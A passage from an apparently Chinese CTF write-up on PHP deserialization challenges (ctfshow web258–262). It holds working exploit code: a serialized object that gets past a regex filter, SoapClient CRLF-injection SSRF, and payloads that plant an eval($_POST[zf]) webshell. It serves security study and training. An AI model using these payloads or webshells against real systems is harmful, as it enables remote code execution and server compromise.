class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">#/[oc]:\d+:/i表示匹配o:1333:或者c:1233:这个就不能匹配o:+1333:</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于为什么用加号函数定义就是这么写的，如果是+那么也能正常执行(以前看到其他解释说的是，+1和1没区别，但是没有说这里C实现的过程)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405182229433.png" alt="image-20220405182229433"></p><p>注意不要直接复制257的哦,属性有修改的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[zf]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$final</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>);</span><br><span class="line"><span class="variable">$final</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:11&quot;</span>,<span class="string">&quot;O:+11&quot;</span>,<span class="variable">$final</span>);</span><br><span class="line"><span class="variable">$final</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:8&quot;</span>,<span class="string">&quot;O:+8&quot;</span>,<span class="variable">$final</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$final</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22eval%28%24_POST%5Bzf%5D%29%3B%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405183256058.png" alt="image-20220405183256058"></p><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<span class="comment">#将xff头安照,分割成数组</span></span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);<span class="comment">#删除数组中最后一个元素</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explode() 函数把字符串打散为数组。</span><br><span class="line">注释：&quot;separator&quot; 参数不能是空字符串。</span><br><span class="line">注释：该函数是二进制安全的。</span><br><span class="line"></span><br><span class="line">array_pop() 函数删除数组中的最后一个元素。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1,127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;y4tacker^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A208%3A%22y4tacker%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406145118002.png" alt="image-20220406145118002"></p><p>接着查看flag.txt</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406145206510.png" alt="image-20220406145206510"></p><h2 id="php原生类反序列化利用"><a href="#php原生类反序列化利用" class="headerlink" title="php原生类反序列化利用"></a>php原生类反序列化利用</h2><h3 id="SoapClient介绍"><a href="#SoapClient介绍" class="headerlink" title="SoapClient介绍"></a>SoapClient介绍</h3><p>php在安装php-soap扩展后,可以反序列化原生类soapclient,来发送http post请求,必须调用soapclient不存在的方法,触发soapclient的__call魔术方法.通过crlf来添加请求题;soapclient可以指定user-agent头,通过添加换行符的形式来加入其他请求内容</p><p>soapclient采用了http作为底层通讯协议,xml作为数据传送的格式,其采用了soap协议(是一种简单的基于xml的协议,它是应用程序通过http来交换信息).</p><p>首先看一下自己有没有soap包扩展,多半是没有的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406134031661.png" alt="image-20220406134031661"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name soap</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406140810430.png" alt="image-20220406140810430"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /lnmp/php-7.3.5/ext/soap</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpize</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure -with-php-config=/usr/local/php/bin/php-config -enable-soap./configure -with-php-config=/usr/local/php/bin/php-config -enable-soap</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406140907376.png" alt="image-20220406140907376"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/php/lib/php/extensions/no-debug-non-zts-20180731/</span><br></pre></td></tr></table></figure><p>手工修改：查找&#x2F;usr&#x2F;local&#x2F;php&#x2F;lib&#x2F;php.ini中的extension_dir &#x3D; “.&#x2F;”，默认是注释掉的<br> 修改为extension_dir &#x3D; “&#x2F;usr&#x2F;local&#x2F;php&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20111222&#x2F;”<br> 并在此行后增加如下，然后保存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extension=soap.so</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406141225975.png" alt="image-20220406141225975"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service php-fpm restart</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -m</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406141348584.png" alt="image-20220406141348584"></p><p>在kali上监听一下8888端口</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406134816758.png" alt="image-20220406134816758"></p><p>新建一个soap.php利用代码,这里直接就在服务器上实现了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.5.152:8888&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> -&gt; <span class="title function_ invoke__">not_a_function</span>();<span class="comment">//调用不存在的方法，让SoapClient调用__call</span></span><br></pre></td></tr></table></figure><p>访问一下这个soap.php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406142534457.png" alt="image-20220406142534457"></p><p>这里可以看到这个soapaction是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的CRLF即插入\r\n</p><p><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;bbb\r\n\r\ntest\r\n&quot;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.5.152:8888&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> -&gt; <span class="title function_ invoke__">not_a_function</span>();<span class="comment">//调用不存在的方法，让SoapClient调用__call</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406143301179.png" alt="image-20220406143301179"></p><p>但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头Content-Type: application&#x2F;x-www-form-urlencoded但Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://192.168.5.152:8888&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;y4tacker^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="string">&#x27;Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt; <span class="title function_ invoke__">not_a_function</span>();</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406144655446.png" alt="image-20220406144655446"></p><p>可以看到是成功了的</p><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>serialize序列化内容之后要包含 ctfshow_i_love_36D 就可以输出flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>);</span><br><span class="line"><span class="comment">#s:18:&quot;ctfshow_i_love_36D&quot;;</span></span><br></pre></td></tr></table></figure><p>所以直接传入ctfshow_i_love_36D</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406145552739.png" alt="image-20220406145552739"></p><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;<span class="comment">#当对象被创建时调用</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">#当反序列化之后调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;<span class="comment">#如果username或者password不等于空即结束</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">#当尝试以调用函数的方法调用对象是调用</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;<span class="comment">#当执行serialize()时调用</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;<span class="comment">#当unserialize时调用</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;<span class="comment">#密码等于usernamepassword</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">#当对象销毁时调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;<span class="comment">#如果code弱等于0x36d,这里代表数字所以username就是877.php就好啦</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;username, <span class="variable language_">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">ctfshowvip</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A25%3A%22%3C%3Fphp+eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406150917802.png" alt="image-20220406150917802"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406150923265.png" alt="image-20220406150923265"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406151019683.png" alt="image-20220406151019683"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406151042537.png" alt="image-20220406151042537"></p><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment">  message.php</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title class_">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里读了一下没有能利用的地方啊,但是他的注释里面有一个message.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span 